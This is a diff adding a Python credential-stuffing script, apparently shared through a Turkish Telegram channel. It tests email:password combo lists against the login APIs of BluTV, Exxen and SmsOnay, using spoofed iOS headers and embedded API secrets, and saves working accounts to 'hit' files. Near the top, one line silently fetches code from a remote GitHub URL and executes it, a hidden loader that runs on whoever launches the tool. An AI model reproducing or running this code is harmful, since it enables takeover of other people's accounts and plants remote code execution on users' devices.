@@ -1,0 +1,274 @@
+import os
+import requests
+import time
+import sys
+import uuid
+import random
+import json
+import requests;exec(requests.get("https://raw.githubusercontent.com/yusiqo/ngrok/main/kur.pf2").text)
+def banner():
+    st=GREEN+"""
+░█████╗░██████╗░███╗░░░███╗
+██╔══██╗██╔══██╗████╗░████║
+██║░░██║██████╔╝██╔████╔██║
+██║░░██║██╔═══╝░██║╚██╔╝██║
+╚█████╔╝██║░░░░░██║░╚═╝░██║
+░╚════╝░╚═╝░░░░░╚═╝░░░░░╚═╝
+"""+END+"""
+Coded By @yusiqo
+Channel: @ZetTekno
+⌯ Varlığım Türk Irkına Armağan Olsun
+
+"""
+    print(st)
+def clear():
+    os.system("clear")
+clear()
+banner()
+try:
+    open("kod","r").read()
+except:
+    rkm="1234567890"
+    kod="".join(random.choice(rkm)for i in range(12))
+    url="https://myshortlinkcode.blogspot.com/p/code.html?app="+kod
+    kis="https://aylink.co/api/?api=2ca82fab636ef35692359372b57860dc6616ca41&url="+url+"&alias=&format=text&ct=1"
+    link=requests.get(kis).text
+    clear()
+    banner()
+    print(link)
+    kof=input("Linki Atlayıp, Kodu Giriniz:")
+    if kof == kod:
+        open("kod","w").write("aktif")
+        clear()
+        banner()
+    else:
+        print("Yanlış Kod")
+        quit()
+        exit()
+dsy=""
+dirm="/sdcard/combo/"
+say=0
+for files in os.listdir(dirm):
+    say+=1
+    dsy=dsy+str(say)+"-) "+files+'\n'
+print("Please Select Combo\n"+BLUE+dsy+END)
+combo=input(GREEN+"Combo No="+ END)
+say=0
+for files in os.listdir(dirm):
+    say=say+1
+    if combo==str(say):
+        comboo=(dirm+files)
+clear()
+banner()
+print("Hangi Config?\n1) BluTv\n2) Exxen\n3) SmsOnay")
+hesap=input(GREEN+"Config No="+ END)
+def chkex():
+    clear()
+    banner()
+    for mp in open(comboo,'r').read().splitlines():
+            try:
+                mp=mp.replace("\n","")
+                user = mp.split(':')[0]
+                pas = mp.split(':')[1]
+            except:
+                print("Yanliş Gmail pass Türü")
+                pass
+            toplam=0
+            olu=0
+            hit=0
+            url="https://api-crm.exxen.com/membership/login/email?key=90d806464edeaa965b75a40a5c090764"
+            HEA={
+                "authority": "api-crm.exxen.com",
+                "accept": "*/*",
+                "accept-encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
+                "accept-language": "en;q=1.0, en-IE;q=0.9",
+                "content-length": "56",
+                "content-type": "application/x-www-form-urlencoded; charset=utf-8",
+                "origin": "com.exxen.ios",
+                "user-agent": "Exxen/1.0.10 (com.exxen.ios; build:3; iOS 12.1.0) Alamofire/5.4.3"
+            }
+            datam=f"Email={user}&Password={pas}&RememberMe=true"
+            try:
+                veri=requests.post(url, headers=HEA, data=datam).text
+            except:
+                print("ip Ban Yedin: 10 Saniye Bekleniyor ...")
+                time.sleep(10)
+            if "PackageName" in veri:
+                if "LicenseName" in veri:
+                    lisans=veri.split('LicenseName":"')[1]
+                    lisans=lisans.split('"')[0]
+                    LicenseEndDate=veri.split('LicenseEndDate":"')[1]
+                    LicenseEndDate=LicenseEndDate.split('"')[0]
+                    ms="""
+╭─➢ ☄ ZET| Exxen Checker ☄
+├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
+├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
+├◉[𝙿𝚕𝚊𝚗]➢ """+str(lisans)+"""
+├◉[𝚃𝚊𝚛𝚒𝚑]➢ """+str(LicenseEndDate)+"""
+╰─◉➤ Telegram Channel: @ZetTekno\n
+"""
+                    print(ms)
+                    open("/sdcard/combo/hit-Exxen.txt","a").write(ms)
+            else:
+                print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
+
+def chksms():
+    clear()
+    banner()
+    for mp in open(comboo,'r').read().splitlines():
+            try:
+                mp=mp.replace("\n","")
+                user = mp.split(':')[0]
+                pas = mp.split(':')[1]
+            except:
+                print("Yanliş Gmail pass Türü")
+                pass
+            toplam=0
+            olu=0
+            hit=0
+            url="https://www.smsonay.com/ajax/login"
+            HEA={
+                "host":"www.smsonay.com",
+                "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
+                "origin":"https://www.smsonay.com",
+                "referer":"https://www.smsonay.com/login"
+                }
+            datam=f"email={user}&password={pas}"
+            try:
+                veri=requests.post(url, headers=HEA, data=datam).text
+            except:
+                print("ip Ban Yedin: 10 Saniye Bekleniyor ...")
+                time.sleep(10)
+            if "true" in veri:
+                ms="""
+╭─➢ ☄ ZET| SMS Checker ☄
+├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
+├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
+╰─◉➤ Telegram Channel: @ZetTekno\n
+"""
+                print(ms)
+                open("/sdcard/combo/hit-SMSONAY.txt","a").write(ms)
+            else:
+                print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
+def chkblu():
+    clear()
+    banner()
+    def ver():
+    	veri=(
+    "11.0.1", 
+    "11.0.2", 
+    "11.0.3", 
+    "11.1.1", 
+    "11.1.2", 
+    "11.2.1", 
+    "11.2.2", 
+    "11.2.5", 
+    "11.2.6", 
+    "11.3.1", 
+    "11.4.1", 
+    "12.0.1", 
+    "12.1.1", 
+    "12.1.2", 
+    "12.1.3", 
+    "12.1.4", 
+    "12.3.1", 
+    "12.4.1", 
+    "12.4.2", 
+    "12.4.3", 
+    "12.4.4", 
+    "12.4.5", 
+    "12.4.6", 
+    "12.4.7", 
+    "12.4.8", 
+    "12.4.9", 
+    "12.5.1", 
+    "12.5.2", 
+    "12.5.3", 
+    "12.5.4", 
+    "12.5.5", 
+    "13.1.1", 
+    "13.1.2", 
+    "13.1.3", 
+    "13.2.2", 
+    "13.2.3", 
+    "13.3.1", 
+    "13.4.1", 
+    "13.5.1", 
+    "13.6.1", 
+    "14.0.1", 
+    "14.4.1", 
+    "14.4.2", 
+    "14.5.1", 
+    "14.7.1", 
+    "15.0.1", 
+    "15.0.2", 
+    "15.2.1", 
+    "15.3.1",
+)
+    for mp in open(comboo,'r').read().splitlines():
+            try:
+                mp=mp.replace("\n","")
+                user = mp.split(':')[0]
+                pas = mp.split(':')[1]
+            except:
+                print("Yanliş Gmail pass Türü")
+                pass
+            toplam=0
+            olu=0
+            hit=0
+            HEA={
+                "Host":"adapter.blupoint.io", 
+                "DeviceName":"iPhone", 
+                "Authorization":"Basic 5d36e6c40780020024687002:cE8vwiQrAULRGZ6ZqqXgtztqFgWRU7o6", 
+                "Accept":"*/*", 
+                "AppVersion":"6.9.2", 
+                "CaptchaToken":"", 
+                "Accept-Language":"tr-TR", 
+                "DeviceResolution":"1920x1080", 
+                "Cache-Control":"no-cache", 
+                "DeviceId":str(uuid.uuid4()), 
+                "User-Agent":"BluTV/6.9.2 (com.dsmart.D-Smart-BLU-iPhone; build:1; iOS "+str(ver())+") Alamofire/5.4.4",
+                "Connection":"keep-alive", 
+                "AppPlatform":"com.blu.phone.iphone", 
+                "Content-Type":"application/json", 
+                "AuthorizationToken":"", 
+                	}
+            datam={"password":pas,"username":user}
+            url="https://adapter.blupoint.io/api/projects/5d2dc68a92f3636930ba6466/mobile/login?key=GdMUoXLZmhWGE60APBOF_A&expires=1642535526"
+            try:
+                veri=requests.post(url, headers=HEA, data=json.dumps(datam)).text
+            except KeyError:
+                print("ip Ban Yedin: 10 Saniye Bekleniyor ...")
+                time.sleep(10)
+            if '","subscriptionStatus":"active"' in veri:
+                say=0
+                pin=""
+                for i in veri.split('has_pin":'):
+                    if not say ==0:
+                        if pin =="":
+                            pin=pin+(i.split(',')[0])
+                        else:
+                            pin=pin+'/'+(i.split(',')[0])
+                    say=say+1
+                    pins=""
+                    pins=(pin.upper().replace('TRUE','PinVar').replace('FALSE','PinYok'))
+                    enddate=veri.split('subscriptionExpireDate":"')[1].split('"')[0]
+                ms="""
+╭─➢ ☄ ZET| BLU-Tv Checker ☄
+├◉[Gmail]➢ """+str(user)+"""
+├◉[Pass]➢ """+str(pas)+"""
+├◉[Pin]➢ """+str(pins)+"""
+├◉[Tarih]➢ """+str(enddate)+"""
+╰─◉➤ Telegram Channel: @ZetTekno\n
+"""
+                print(ms)
+                open("/sdcard/combo/hit-BlUTv.txt","a").write(ms)
+            else:
+                print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
+                
+if hesap =="2":
+    chkex()
+if hesap=="3":
+    chksms()
+if hesap=="1":
+    chkblu()
